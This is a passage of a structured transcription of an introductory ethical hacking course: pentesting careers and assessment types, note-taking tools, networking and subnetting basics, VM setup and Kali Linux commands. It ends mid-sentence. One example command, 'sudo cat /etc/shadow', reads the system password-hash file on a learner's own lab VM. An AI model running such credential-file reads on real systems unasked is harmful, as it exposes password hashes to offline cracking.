# Practical Ethical Hacking – Full Transcription (Reorganized Markdown Version)

> **Note:** This document is a **reorganized and lightly structured** version of the original transcription.  
> **No information has been added, removed, or altered.**  
> Only formatting, grouping, and minor rephrasing for clarity have been applied.

---

## #1. Instructor Introduction & Course Overview

### Who is the Instructor?

- Name: **Heath Adams**
- Roles and personal details:
  - Husband
  - Ethical hacker
  - Teacher
  - Gamer (when time allows)
  - Sports fan
  - Animal dad
- Business:
  - **Owner at TCM Security**
  - TCM Security is a **cybersecurity consulting and education firm**
- Professional role:
  - Ethical hacker / penetration tester
  - Companies pay him to attempt to break into:
    - Networks
    - Wireless networks
    - Web applications
    - Physical buildings (physical pentesting)
  - Essentially: paid to hack whatever the client wants him to test

### Ethical Hacking Industry & Backgrounds

- Ethical hacking is a **booming industry**.
- Many people enter from **non-technical / unusual backgrounds**:
  - Heath himself was an **accountant** before cybersecurity.
  - Others he’s seen: doctors, dentists, lawyers, and many more.

### Purpose of the Course

- Designed for people **interested in ethical hacking**.
- Goal:
  - Introduce **basics**
  - Explain what an ethical hacker does
  - Walk through **techniques and methodology**
- Course style:
  - **Heavily hands-on**
  - **Very little PowerPoint**
  - After the brief intro, it’s almost all practical work.

### How to Reach Heath & TCM

- Heath is approachable on:
  - **LinkedIn**
  - **Twitter**
  - **YouTube**
  - **Twitch**
- Encouragement:
  - Subscribe on YouTube
  - Like, comment, give feedback
- TCM brands:
  - `tcm-security.com` – consulting side
  - Academy site – educational side
  - Certification site – certification side (covered briefly below)

---

## #2. Course Scope & Structure

### This Free Course vs Full Course

- This **YouTube / free version**:
  - **12 hours** of content
  - Represents **12 hours out of a 25-hour full course**
  - Gets you through the **first half** and to a **good stopping point**
- Full paid course has additional content (covered later).

### Curriculum for This (Partial) Course

Heath scrolls through and explains the curriculum (everything will also be linked in the description):

1. **Note Keeping**
2. **Computer Networking**
3. **Python**
4. **Foundational Skills Before Hacking:**
   - Note keeping
   - Setting up a lab
   - Installing Linux
   - Running through Linux basics
5. After foundations:
   - **Ethical Hacker Methodology**
   - **Five Stages of Ethical Hacking** (detailed later)
6. **Information Gathering / Reconnaissance**
   - Gathering information on a target:
     - Social media
     - Email addresses
     - Intelligence on companies/individuals
   - Techniques for information gathering and reconnaissance
7. **Scanning and Enumeration**
   - Working with an intentionally vulnerable machine
   - Scan it with tools learned during the course
   - Identify vulnerabilities
8. **Exploitation**
   - Learn basics of exploitation
   - Hack the vulnerable machine
9. **Capstone**
   - 5 intentionally vulnerable machines created by TCM
   - Download and run locally
   - Your goal: hack into each machine
   - This forms the **capstone project** and the **end of the 12-hour section**

### Paid Upsell (Limited to 30–60 seconds by Heath)

Heath emphasizes this is the **only time** he will try to sell anything in the course:

- If you continue with the **full course**, it additionally covers:
  - **Exploit development**
  - **Active Directory**:
    - Heath’s favorite topic
    - Many AD attacks demonstrated
  - **Post-exploitation**
  - **Web application enumeration**
  - **OWASP Top 10 web application attacks**
  - **Wireless penetration testing**
  - **Legal documentation**
  - **Report writing**
  - **Career advice**
- All TCM courses (at time of recording):
  - About **12 different courses**
  - Topics include:
    - Linux
    - Python
    - Open source intelligence (OSINT)
    - Pen testing & advanced pen testing
    - Mobile pen testing
    - Malware analysis
    - Phishing
  - **No course costs more than $30.**

### Certification from TCM

- There is a certification track tied to this course:
  - **Practical Network Penetration Tester (PNPT)** certification.
- To learn more:
  - Visit `certifications.tcm-sec.com` (Heath abbreviates it as `certifications.tcm dot ...`).
- Claims:
  - PNPT is “cool and industry changing” (Heath’s words).
- After this brief pitch:
  - He stops selling and returns to 12 hours of free content.

---

## #3. Transition Into Ethical Hacking Content

### Next Steps After Intro

- Begin **12 hours of free material**:
  - How to become an ethical hacker.
- First topics:
  - Day in the life of an ethical hacker
  - Why he loves pentesting
  - Types of engagements
  - Soft skills & technical skills required

---

## #4. Day in the Life of an Ethical Hacker

### Why Pen Testing? (Heath’s Perspective)

**For Heath personally:**

- **Work-from-home lifestyle**:
  - Rolls out of bed at ~7:55 AM
  - Makes coffee
  - At desk by 8:00 AM
  - No traffic, no commute
  - Saves a lot of time
  - Loves the WFH lifestyle (but admits it’s not for everyone)
- **Salaries**:
  - Very high:
    - His **first job** in the field:
      - **Over six figures (> $100,000)** as a first-year pen tester
    - Typical progression:
      - Senior pentester: ~**$150,000**
      - Manager: **$170,000–$200,000**
      - Even more if you:
        - Start your own business
        - Do your own consulting
  - Reasons salaries are high:
    - Highly technical field
    - **Job and people shortage** (more jobs than people)
- **Benefits & work–life balance**:
  - Typically good, but depends on employer
  - Heath:
    - Works ~40 hours/week
    - Benefits have been “fantastic”
    - Previously as an accountant:
      - 60+ hour weeks
      - 7-day weeks
      - In office when dark, leaving when dark
      - Easily leads to depression
    - Has not experienced that in penetration testing
- **Mentally stimulating**:
  - Constant learning; field changes continuously
  - “Lifelong learner” personality fits well
  - New attacks and new defenses appear frequently
  - Cat-and-mouse game:
    - Defenders trying to block attacks
    - Attackers trying to bypass defenses
    - If you don’t stay up to date, you get left behind
- **Legal breaking and entering**:
  - Gets to:
    - Break into buildings
    - Break into websites
    - Break into networks
  - And gets **paid** to do it
  - Surprised when first learning hackers can be **good guys** and legal.

---

## #5. Types of Pentest Assessments (Day-to-Day Work)

Heath lays out a typical set of assessments he does (not exhaustive):

### Network Penetration Testing

1. **External Network Assessment**
   - Assessing the network from the **outside**.
   - Could attack from:
     - China
     - U.S.
     - Russia
     - Any country
   - “Outside looking in.”
2. **Internal Network Assessment**
   - Assumes:
     - You have already breached the network
     - You have a dropbox device
     - You have some code execution internally
     - You logged into their VPN, etc.
   - Question: **What can we do once we are inside?**
   - Heavy focus on:
     - **Active Directory pen testing** (central to this course)
   - Methodology:
     - Similar between external and internal
   - Toolsets & specific attacks:
     - Different enough to be considered somewhat separate disciplines

### Web Application Penetration Testing

- Assessing a **website or web application**.
- Goals:
  - Break the site
  - Login as an administrator
  - Access restricted areas
  - Evaluate the **security posture** of the web application.
- Uses specialized tools and methodologies:
  - Course will cover:
    - **OWASP Top 10** web application vulnerabilities

### Wireless Penetration Testing

- Evaluating **wireless networks**.
- Often done on-site:
  - Attempt to hack into the wireless network.
  - Investigate:
    - Guest networks
    - Network segmentation:
      - Guest network **should not** access same network as employees, but often does.
    - Rogue devices on the wireless network.

### Social Engineering

Heath groups three types as part of social engineering:

1. **Physical Assessments**
   - On-site attempts to break into buildings.
   - Target: specific area, e.g. server closet or critical location.
   - Techniques:
     - Lock picking
     - Social engineering staff
     - Cloning badges
     - Tailgating and other access tricks
2. **Social Engineering / Phishing (Digital)**
   - Phishing campaigns:
     - Emails
     - Links
     - Attachments
   - Goals:
     - Harvest credentials
     - Determine who clicks links
     - Obtain passwords
3. **Vishing / Phone-Based Social Engineering**
   - Calling people on the phone
   - Attempting to gather information or credentials.

### SOC Assessments / Purple Teaming

- **SOC assessment** (Security Operations Center assessment) also called:
  - **Purple teaming**:
    - Red (attackers) + Blue (defenders) = Purple
- Process:
  - Offensive team (red) and defensive team (blue) sit together.
  - They coordinate:
    - Which attacks the red team will run.
    - Whether the blue team can detect those attacks.
  - Examples:
    - Red runs a specific attack and blue sees if it triggers alerts.
    - Red plugs into the network; blue checks whether it’s detected/prevented.
  - If blue doesn’t detect the attack:
    - Red helps blue baseline detection for that attack.
  - Benefits:
    - Blue team learns new attack techniques.
    - Red team learns defensive methods and how to bypass them:
      - If the first attempt is blocked, red tries an alternative.

---

## #6. Reporting & Debriefing

### Reporting

- After each assessment, Heath must write a report:
  - Document:
    - What was done
    - What was found
    - Impact
    - Remediation instructions
- Many don’t like writing reports (Heath includes a “sad face” remark), but:
  - **Reporting is absolutely part of the job.**
- Strong **written communication** is necessary for success in this field.

### Debriefs (Presenting the Report)

- After writing the report:
  - Present it to the client in a **debrief** meeting.
- Debrief responsibilities:
  - Walk through the findings
  - Explain:
    - What’s wrong
    - Why it’s wrong
    - How to fix it
- Requires:
  - Technical skillset (for the findings)
  - Ability to **explain clearly** in non-technical language
  - Ability to **speak in front of people**
- Personality & social:
  - You do **not** need to be an extrovert.
  - Heath is very introverted, yet still successful.
  - Need to be able to turn on “professional persona” temporarily.

---

## #7. Technical Skills Needed (Base & Preferred)

Heath explains both **base-level** and **preferred** technical skills for an interview:

### Base-Level Skills (Should Have)

1. **Linux**
   - Preferably:
     - **Kali Linux** or
     - **Parrot OS**
2. **Networking Knowledge**
   - OSI model
   - Key protocols:
     - TCP
     - UDP
     - HTTP
     - Etc.
3. **Scripting Skills**
   - Python scripting
   - Bash scripting
4. **Solid Hacking Methodology**
   - Understanding of:
     - Reconnaissance
     - Scanning
     - Exploitation
     - Post-exploitation
     - Reporting
5. **Tool Familiarity**
   - Metasploit
   - Burp Suite
   - Nessus
   - If this sounds like a foreign language, Heath says:
     - That’s fine now.
     - Go through the course fully.
     - Then re-watch this section; it will all make sense.

### Preferred Skills (Nice to Have, Will Make You Stand Out)

1. **Active Directory**
   - Described as **“huge”**.
   - Most candidates have a decent base but lack strong AD skills.
   - Knowing AD puts you **ahead of the game**.
2. **Wireless Attacks**
   - Understanding how to attack wireless networks.
3. **OWASP Top 10**
   - Knowing top web application vulnerabilities.
4. **Coding Skills**
   - Not just scripting but **coding**:
     - For writing new tools
     - Contributing to the community
   - Heath notes:
     - You do **not** have to be a full-fledged developer.
     - If you only ever script, you can still be very successful.
     - Coding lets you build more advanced tools and contribute to open-source.

- Summary:
  - **Base skills** may be enough to land a job.
  - **Preferred skills** + strong base = very strong candidate.

---

## #8. Soft Skills Required

Heath emphasizes soft skills are often under-discussed but **critical**.

### Social & Communication Skills

- Need to:
  - Debrief to clients
  - Present technical findings in plain language
  - Possibly do social engineering
- Does **not** require extroversion.
- Requires ability to:
  - Communicate effectively
  - Write clearly (reports, documentation)

### Desire to Learn

- Must have a **strong desire to learn**:
  - Self-directed learning
  - Study outside of work
  - Keep pace with new:
    - Exploits
    - Patches
    - Defensive techniques
- Field is **cat-and-mouse**:
  - Yesterday’s exploit might be patched today.
  - Need to stay ahead.

### Perseverance

- Must have a mindset of **not giving up**:
  - Problems are not always obvious.
  - Many tasks require:
    - Research
    - Trial and error
- On real hosts:
  - It might appear there are no exploits at first glance.
  - Must push through, exhaust all potential avenues.
- Defines a good hacker as:
  - Someone who *does not quit* and *keeps trying* until all resources are exhausted.

### Non-Complacency

- Cannot be **complacent** if you want to be a pen tester.
- Many IT workers:
  - Stay in the same role 5–10 years without learning new skills.
- Pentesters must:
  - Continuously move up
  - Always want more knowledge
  - Never settle with current skill level

### Contribution to the Community

- Recommends:
  - Blog
  - Twitter
  - GitHub
  - YouTube
  - Twitch
  - Any platform where you produce content and contribute
- Benefits:
  - Demonstrates passion and initiative
  - Often asked in interviews:
    - “Where do you get your news?”
    - “Do you have a blog?”
  - Employers value community contribution.
- Content does **not** have to be original:
  - You can rewrite existing topics in **your style**.
  - Your style may help someone who didn’t like other resources.

---

## #9. Course Plan After Intro & Soft Skills

### Next Modules

1. **Effective Note Keeping**
   - Importance
   - Tools recommendation
   - How to structure notes for:
     - Personal study
     - Live assessments
2. **Networking Refresher**
   - For those who:
     - Don’t know TCP, UDP, three-way handshake
     - Are shaky on subnetting
     - Don’t know OSI model
   - If you know all topics listed already, you can **skip** the refresher.

Heath warns:
- Networking is a core foundation for pentesting.
- If your networking is weak, stick around for the refresher.

---

## #10. Effective Note Keeping (Theory & Tools)

### Why Note Keeping is Critical

- Essential for:
  - Career success
  - Success in this course
- Helps:
  - Track commands used
  - Recall what worked or failed
  - Prepare high-quality reports later
  - Respond to clients who revisit findings months or years later

### Heath’s Personal Notebook Example

- Uses **KeepNote** as his primary note-taking tool (on Windows).
- Has multiple notebooks:
  - Example shown: **Active Directory notebook**
    - Built from:
      - Several courses taken in the past
      - Real assessment work
    - Acts as a **cheat sheet**
- Structure:
  - Modules (like Module 1, Module 2)
  - Sub-notes and child notes
  - Examples:
    - **Enumeration** section:
      - Commands like `net domain` (example: `Get current domain`).
      - Screenshots showing:
        - Command being run
        - The exact output
- Over time:
  - Pictures may become unnecessary once commands are memorized.
  - But at first, screenshots help with:
    - Memorization
    - Quick reference

### Example: Real Assessment Notes

- Heath shows an actual client assessment notebook:
  - Had:
    - External
    - Internal
    - Web application assessments
  - Example findings:
    1. **SMB Signing Disabled**
       - Screenshot of output
       - Highlighted evidence
       - IP address included
       - Shows lack of SMB message signing.
    2. **MS-17-010 Vulnerability**
       - Screenshot: scanner shows target not patched
       - Documented as potential exploit path

- Method:
  - Each finding has:
    - Screenshot
    - IP address
    - Possibly text notes
  - Uses green check marks:
    - When a finding is documented in the report, he marks it as checked.

### Note Keeping Style

- Style is **personal**; do what works for you.
- Some people log:
  - Dates
  - Times
  - Step-by-step commands
- Others keep high-level notes.

### Recommended Note Taking Tools

1. **KeepNote**
   - Works on:
     - Windows
     - Linux
     - Mac OS X
   - Heath’s primary tool.
   - Downsides:
     - Has not been updated in a long time.
2. **CherryTree**
   - Comes **built into Kali Linux**.
   - Will be demonstrated later in the Linux section.
3. **OneNote**
   - Great option if using Microsoft ecosystem.
4. **Joplin**
   - Popular among Mac users (per student feedback).

- Heath will:
  - Put links to all these tools in course resources.
- You are not limited to these four; use any note tool you like.
- Pen and paper is also acceptable, but good structure is advised.

### Key Reminder

- Heath **will harp on note keeping** throughout the course:
  - You will forget commands without notes.
  - The course covers so much that notes are crucial.

---

## #11. Installing Note & Screenshot Tools on Windows

Heath shows installation of:

1. **KeepNote**
2. **GreenShot** (screenshot tool)

### Installing KeepNote on Windows

- Steps:
  1. Go to Google; search `KeepNote`.
  2. Navigate to `keepnote.org`.
  3. Download Windows (or relevant OS) installer.
  4. Run `.exe`:
     - Click through:
       - Next
       - Accept license
       - Install
  5. Launch KeepNote.

- Notes:
  - Also works on Linux and Mac OS X.
  - Some people dislike that it’s outdated; Heath is fine with it.

### Installing GreenShot on Windows

- GreenShot:
  - Screenshot capturing tool
  - Heath’s **top recommendation** if you pick only one tool.

- Steps:
  1. Search `GreenShot download`.
  2. Download latest stable build.
  3. Run installer:
     - Accept agreement
     - Click next
     - Possibly let it start with Windows (Heath prefers this).
  4. Finish.

- If on Linux (or non-Windows):
  - GreenShot not available.
  - Suggested alternative: **FlameShot** (similar, but Heath has never used it).

### Using GreenShot

- Assigned to `PrintScreen` key:
  - Press `PrintScreen`:
    - Get crosshair / region selection.
  - After capturing region:
    - Options:
      - Save image
      - Open in GreenShot image editor

- In editor:
  - Common actions:
    - **Add border**:
      - Effects → Add border
    - **Invert colors**:
      - Especially for Kali’s black terminal (good for printing or reports).
    - **Highlight**:
      - Use highlight tool to emphasize lines or values.
    - **Obfuscate / Pixelate**:
      - To hide sensitive information such as passwords.

- Usage in workflow:
  - After annotation:
    - Copy to clipboard
    - Paste in KeepNote (or other note tool)
    - Save as part of your assessment notes

---

## #12. Networking Refresher – IP Addresses & Protocols

Heath moves into networking; section is called **Networking Refresher**.

### IP Addresses – IPv4 & IPv6

- On Kali:
  - Uses `ifconfig` to show IP information.
  - Example output:
    - `inet 192.168.57.139` (IPv4)
    - `inet6 ...` (IPv6)

- **IPv4**:
  - Dotted decimal notation, e.g. `192.168.57.139`.
  - Composed of **4 octets**:
    - Each octet = 8 bits (ones and zeros).
    - Total = 32 bits = 4 bytes.
  - Example binary representation:
    - `255` = all bits set to 1:
      - `128 + 64 + 32 + 16 + 8 + 4 + 2 + 1 = 255`.
    - `7` = `4 + 2 + 1`.

- **IPv6**:
  - Hexadecimal notation (e.g. `fe80::...`).
  - **128-bit** address space.
  - Far more addresses than IPv4:
    - `2^128` – astronomically large.
  - Not widely adopted in practice vs IPv4.

### IPv4 Address Exhaustion & NAT

- Total IPv4 addresses:
  - `2^32 ≈ 4.29 billion` addresses.
- Problem:
  - More devices than IPv4 addresses.
- Solution:
  - **NAT (Network Address Translation)**:
    - Uses **private IP addresses** internally:
      - Common ranges:
        - `10.0.0.0/8` (Class A private)
        - `172.16.0.0/12` (private)
        - `192.168.0.0/16` (Class C private)
    - All internal devices share:
      - A single **public IP address** from ISP.
- Example:
  - Heath’s home network:
    - 20+ devices:
      - Phones
      - Cameras
      - Smart TVs
      - etc.
    - They all use internal IPs like `192.168.x.x`.
    - All traffic goes out via the router’s single public IP.

### Private IP Ranges

Heath uses an external image (Google search) to explain three main private classes:

- **Class A**:
  - `10.0.0.0 – 10.255.255.255`
  - Fewer networks, many hosts per network.
- **Class B**:
  - Internal private ranges (172.16 – 172.31).
- **Class C**:
  - `192.168.0.0 – 192.168.255.255`
  - Many networks, fewer hosts per network.
  - Typical for:
    - Home
    - Small business

- Public IPs:
  - Anything outside these ranges (and not loopback `127.0.0.1`).

---

## #13. Layer 2 – MAC Addresses

### MAC Address / Physical Address

- From `ifconfig`, you see `ether` followed by a MAC address, e.g. `00:0c:29:...`.
- MAC stands for **Media Access Control**.
- Unique to each Network Interface Card (NIC).
- Used by **switches** at **Layer 2** to route frames.

### Vendor Lookup

- First 3 octets (6 hex digits) of MAC = **OUI (Organizationally Unique Identifier)**.
- You can copy these and paste into a MAC address lookup:
  - E.g. might show `VMware` as vendor.
- Useful for:
  - Device identification on network

### Quick Summary

- MAC addresses:
  - Layer 2
  - Used by switches
  - Help identify vendor
  - Different from IP (Layer 3) addresses

---

## #14. TCP vs UDP & Three-Way Handshake

### Basic Concepts

- **TCP (Transmission Control Protocol)**:
  - Connection-oriented
  - Reliable
  - Examples:
    - HTTP
    - HTTPS
    - SSH
    - FTP
- **UDP (User Datagram Protocol)**:
  - Connectionless
  - Less reliable, but faster
  - Examples:
    - DNS
    - VoIP
    - Streaming services

### TCP Three-Way Handshake

- Steps:
  1. **SYN**:
     - Client sends `SYN` packet to server (request connection).
  2. **SYN-ACK**:
     - Server responds with `SYN-ACK` if port is open.
  3. **ACK**:
     - Client responds with `ACK` to complete connection.

- Analogy:
  - You say “Hello” (SYN).
  - Neighbor responds “Hello, I acknowledge you” (SYN-ACK).
  - You confirm and start conversation (ACK).

### Ports & Services

- TCP connections:
  - To/from **ports**.
- Examples:
  - HTTP: port 80
  - HTTPS: port 443

### Demonstration with Wireshark

- Heath opens **Wireshark** on Kali.
- Captures packets as he refreshes Google.
- Identifies handshake:
  - Source IP: `192.168.57.139`
  - Destination: some Google IP
  - Uses:
    - `SYN`
    - `SYN-ACK`
    - `ACK` packets to form connection on port `443`.

- Emphasizes:
  - You will revisit this in **scanning & nmap** sections.
  - Particularly:
    - Stealth scanning uses partial handshake (SYN then RST).

---

## #15. Common Ports & Protocols

Heath provides a quick table of **common ports**:

### TCP Ports

- **21 – FTP**
  - File Transfer Protocol
  - Upload/download files
- **22 – SSH**
  - Secure Shell
  - Remote login (encrypted)
- **23 – Telnet**
  - Cleartext remote login
- **25 – SMTP**
  - Simple Mail Transfer Protocol (mail)
- **110 – POP3**
  - Post Office Protocol (mail)
- **143 – IMAP**
  - Internet Message Access Protocol (mail)
- **53 – DNS** (TCP and UDP)
  - Domain Name System
- **80 – HTTP**
  - Unencrypted web traffic
- **443 – HTTPS**
  - Encrypted web traffic
- **139, 445 – SMB**
  - Samba / SMB file sharing
  - Frequently exploited (e.g. MS-17-010 / EternalBlue):
    - Used by WannaCry ransomware

### UDP Ports

- **53 – DNS**
  - DNS commonly uses UDP for queries.
- **67/68 – DHCP**
  - Dynamic Host Configuration Protocol:
    - Assigns IP addresses.
- **69 – TFTP**
  - Trivial File Transfer Protocol
- **161 – SNMP**
  - Simple Network Management Protocol
  - When misconfigured (e.g. default community strings), can leak network info.

---

## #16. OSI Model

Heath introduces the **OSI model** as a conceptual tool.

### Mnemonic

- `P D N T S P A`:
  - **P** – Physical
  - **D** – Data Link
  - **N** – Network
  - **T** – Transport
  - **S** – Session
  - **P** – Presentation
  - **A** – Application
- Mnemonic: **“Please Do Not Throw Sausage Pizza Away.”**

### Layers & Examples

1. **Layer 1 – Physical**
   - Cables (Cat6, etc.)
   - Physical connections
2. **Layer 2 – Data Link**
   - Switching
   - MAC addresses
3. **Layer 3 – Network**
   - IP addresses
   - Routing
4. **Layer 4 – Transport**
   - TCP / UDP
5. **Layer 5 – Session**
   - Session management
6. **Layer 6 – Presentation**
   - Media formats:
     - `jpeg`
     - `wmv`
     - Video encoding
7. **Layer 7 – Application**
   - Protocols like HTTP, SMTP, etc.

### Troubleshooting with OSI

- When troubleshooting:
  - Start at **Layer 1** (physical) and move up:
    1. Is the cable plugged in?
    2. Are link lights blinking?
    3. Does the device have an IP address?
    4. Can you ping?
    5. Does the application work?

- In professional conversation:
  - People may simply say:
    - “Layer 2 issue” instead of “switching problem.”
    - “Layer 3 issue” instead of “routing problem.”

---

## #17. Subnetting – Theory & Practice

Heath explains subnetting, focusing on:

- Subnet masks
- Host counts
- Network ID & broadcast address

### Viewing Subnet Mask on Kali

- `ifconfig` shows:
  - `inet 192.168.57.139`
  - `netmask 255.255.255.0`

- Subnet mask:
  - 4 octets of 8 bits each
  - 1 bit = 1 or 0
  - `255` is `11111111`
  - `0` is `00000000`

### Provided Excel Cheat Sheet

Heath provides a **subnetting cheat sheet** in Excel (course resources):

- Shows:
  - Bits per octet
  - Subnet masks expressed as decimal
  - Number of hosts purch slash
  - ‘/’ notation (CIDR)

### Slash Notation

- `/24`:
  - 255.255.255.0
  - 8+8+8 bits = 24 bits “on”
  - `2^(32-24) = 256` total addresses
  - 256 - 2 = 254 usable hosts
- `/16`:
  - 255.255.0.0
  - 16 bits “on”
  - More hosts, fewer networks
- `/8`:
  - 255.0.0.0
  - Even more hosts

### Quick Subnet Construction Method

Heath demonstrates constructing quick reference table:

- Columns 1–32 correspond to potential `/1` through `/32`.
- Start with `128` value in leftmost (bit 1).
- Then `64`, `32`, `16`, `8`, `4`, `2`, `1`.
- Summing diagonals or bits gives subnet mask values: 
  - e.g.:
    - `128+64=192`
    - `192+32=224`, etc.
- Quick mental doubling method:
  - Host count:
    - `2^(# of host bits)`:
      - `/24` → 8 host bits → `2^8=256`.
      - `/23` → 9 host bits → `512`.
      - etc.

### Network ID & Broadcast Address

- Typically:
  - **Network ID** = first address
  - **Broadcast** = last address
- Example:
  - `192.168.1.0/24`
    - Subnet mask: `255.255.255.0`
    - Hosts: `256 total, 254 usable`
    - Range: `.1 – .254`
    - Network ID = `.0`
    - Broadcast = `.255`

### Subnet Splitting Example (/28)

- `192.168.1.0/28`
  - Subnet: `255.255.255.240`
  - 16 total addresses, 14 usable
  - Range:
    - Network ID: `.0`
    - Broadcast: `.15`
    - Usable: `.1 – .14`
- Next subnet:
  - `192.168.1.16/28`
  - Next: `.16 – .31`, etc.

### Larger Network Example (/23)

- `192.168.1.0/23` is actually:
  - `192.168.0.0 – 192.168.1.255`
- Explanation:
  - `255.255.254.0` mask.
  - Spans 2 Class C ranges: `.0` and `.1`.
- Host count:
  - `2^(32-23)=2^9=512 total`
  - 510 usable

### Practice Problems

Heath provides exercises:

- Find subnet, host count, network, broadcast for:
  1. `192.168.0.0/24`
  2. `192.168.1.0/26`
  3. `192.168.1.0/25`

Encourages:
- Re-watch video
- Use cheat sheet
- Understand concept vs memorizing full table

---

## #18. Virtualization – VMs & Tools

Heath introduces virtual machines:

### What is a VM?

- A **machine inside a machine**.
  - Example:
    - Running Windows 10 inside a Windows 10 host.
    - Also running Linux VM inside that same host.

- Use-case:
  - Build labs without extra physical hardware.
  - Many pentesters run Kali inside a Windows machine day-to-day.

### Resource Considerations

- If you only have **8 GB RAM**:
  - Might be tight, but still usable.
- For **Active Directory lab** later:
  - Recommended: at least **16 GB RAM** on host.

### VM Software Options

1. **VMware Workstation Player**
   - For:
     - Windows
     - Linux
   - Free for personal use.
2. **Oracle VirtualBox**
   - For:
     - macOS
     - Windows
     - Linux
   - Free and open-source.

- In the course:
  - Heath uses **VMware Workstation Player** and sometimes **VMware Workstation Pro**.
  - Mac users should use **VirtualBox** (instructions analogous).

### Installing VMware Workstation Player (Windows/Linux)

- Steps:
  1. Search `VMware Workstation Player download`.
  2. Download installer for Windows or Linux.
  3. Run installer:
     - Next
     - Accept license
     - Install enhanced keyboard driver (optional but recommended)
     - Uncheck improvement program & auto product update if desired.
     - Finish and restart when prompted.

### Installing VirtualBox (Windows example)

- Steps:
  1. Download from `virtualbox.org` → Downloads → Windows hosts.
  2. Run `.exe`:
     - Next through the wizard:
       - Install networking
       - Accept any warnings.
  3. Launch VirtualBox.

### VMware Workstation Pro vs Player

- Pro:
  - Paid, more features, nicer multi-VM management.
  - Trial available for 30 days.
- Player:
  - Free, fully sufficient for this course.
  - For running multiple VMs:
    - Might need to open multiple Player instances manually.

---

## #19. Installing Kali Linux VM

Heath prefers using **pre-built Kali images** for VMware/VirtualBox.

### Download Kali VMware Image

- Steps:
  1. Search `Kali Linux download`.
  2. Scroll to **Custom Image Downloads (Offensive Security)**.
  3. Select `Kali Linux VMware images`.
  4. Download 64-bit image (`.7z` file).
  5. Extract with **7-Zip** (if not installed, download 7-Zip).
  6. Open extracted folder:
     - Contains `.vmx` or `.ovf` file for VM.

### Import into VMware Workstation Player

- Steps:
  1. Open VMware Player.
  2. Click `Open a Virtual Machine`.
  3. Navigate to extracted Kali folder.
  4. Open `.vmx` or `.ovf` file.
  5. Edit VM settings:
     - Memory:
       - 2 GB minimum (works).
       - 4 GB recommended or more.
     - Network Adapter:
       - Set to **NAT** (not Bridged).
  6. Power on VM.
  7. If prompted whether moved/copied:
     - Choose `I copied it`.

### First Login

- Default credentials in older Kali images:
  - Username: `kali`
  - Password: `kali`
- In new versions:
  - Non-root user as default.

### Version Differences

- Heath notes:
  - Early parts recorded with Kali 2019.3, later updated to 2020.4 and beyond.
  - UI and background may differ.
  - Commands and content remain 95% the same.

---

## #20. VirtualBox – Extension Pack & NAT Network

If you use VirtualBox, Heath recommends these setup steps:

### Install VirtualBox Extension Pack

- Steps:
  1. Search `VirtualBox extension pack`.
  2. Download `All supported platforms`.
  3. Open VirtualBox → `Preferences` → `Extensions`.
  4. Click `+` → select downloaded `.vbox-extpack` file.
  5. Install and accept license.

### Create NAT Network

- Steps:
  1. In VirtualBox → `Preferences` → `Network`.
  2. Click `+` to add new NAT network.
  3. Configure:
     - Subnet: e.g. `192.168.57.0/24`.
     - Check `Enable DHCP`.
  4. Click `OK`.

### Attach VMs to NAT Network

- For each VM:
  1. Open its `Settings`.
  2. Go to `Network`.
  3. Set `Attached to: NAT Network`.
  4. Choose the NAT network you created.

- This ensures:
  - All VMs share the same virtual subnet.
  - No IP conflicts.

---

## #21. Kali Linux Overview & Terminal Focus

### Kali Linux Quick Tour

- Applications menu → Tools grouped by phases:
  - Information Gathering
  - Vulnerability Analysis
  - Web Application Analysis
  - Password Attacks
  - Wireless Attacks
  - Exploitation Tools
  - Sniffing/Spoofing
  - Post Exploitation
  - Forensics
  - Reporting Tools
- Tools organized by category and sub-category (DNS, SMB, OSINT, etc.).

### Terminal as Primary Interface

- Although GUI available for:
  - File browsing
  - Settings
- Most hacking tasks:
  - Done via **terminal** / command line.

---

## #22. sudo & Root in Kali

### Old vs New Kali

- Previously:
  - Default user = root.
- New versions (2020.1+):
  - Default user = `kali`
  - Need to use `sudo` for privileged commands.

### Using `sudo`

- Example:
  - `cat /etc/shadow` fails as normal user (permission denied).
  - `sudo cat /etc/shadow`:
    - Prompts for user password (`kali` by default).
    - Then shows hashed passwords.

- `sudo` = **super user do**:
  - Run a specific command as root.
  - Still remain as `kali` after it completes.

### Switching to Root

- Sometimes beneficial to fully switch to root:
  - `sudo su -`
- Then:
  - Shell prompt changes to root user.
- Only for that tab/session.

### `sudoers` File

- Only users in the `sudoers` group can use `sudo`.
- Example:
  - `kali` is in `sudoers`.
  - A separate user (like `john`) might not be.

- Good practice:
  - Use `sudo` as needed.
  - Do **not** run everything as root unless you understand the consequences.

---

## #23. Navigating Kali File System

### Basic Commands

- `pwd`: Print working directory.
- `cd`: Change directory.
  - `cd ..`: Go up one level.
  - `cd /`: Go to root of file system.
  - `cd ~`: Go to home directory.
- `ls`: List in current directory.
  - `ls -la`: List all files (including hidden) with details.
- Hidden files:
  - Begin with `.` (e.g. `.cache`).

### Creating & Deleting Directories

- `mkdir heath`: Create directory named `heath`.
- `rmdir heath`: Remove empty directory named `heath`.

### Copying & Moving Files

- `cp source dest`: Copy file.
- `mv source dest`: Move (or rename) file.
- Can specify full paths or relative paths.

### Locating Files

- `locate bash`:
  - Uses prebuilt database to find files with name `bash`.
- If `locate` returns nothing or outdated:
  - Run `updatedb` to refresh file database.

---

## #24. Changing Password & `man` Pages

### Change Password

- `passwd`:
  - Prompts for new password.
  - Heath uses `verysecurepassword` as example, but encourages strong unique passwords.

### `man` Pages (Manual)

- `man ls`:
  - Shows manual page for `ls`.
- `ls --help`:
  - Quick inline help, less detailed than `man`.

---

## #25. File Permissions, Users & Privileges

### Understanding File Permissions

Using `ls -la`, you see:

- First char:
  - `-` = file
  - `d` = directory
- Next 9 chars:
  - Grouped into three sets:
    - Owner permissions: `rwx`
    - Group permissions: `r-x`
    - Others permissions: `r-x`
- `r` = read, `w` = write, `x` = execute.

Example:

- `-rwxr-xr-x`:
  - File
  - Owner: read/write/execute
  - Group: read/execute
  - Others: read/execute

### `chmod` – Changing Permissions

- Numeric method:
  - `7` = `rwx`
  - `4` = `r--`
  - `5` = `r-x`
  - etc.
- Example:
  - `chmod 777 file`:
    - Full read/write/execute for everyone.
- Symbolic method:
  - `chmod +x file`:
    - Adds execute for all.

### Users & `/etc/passwd` and `/etc/shadow`

- Adding user:
  - `adduser john`
  - Sets password, etc.
- `/etc/passwd`:
  - Lists all users.
  - Historically contained hashes; now uses `x` placeholder.
- `/etc/shadow`:
  - Contains hashed passwords (only root can read).
- Attack significance:
  - If attacker gets `/etc/shadow`, they can attempt password cracking offline.

### `su` – Switch User

- `su john`:
  - Switch session to user `john` (requires john’s password).
- `su -` without username:
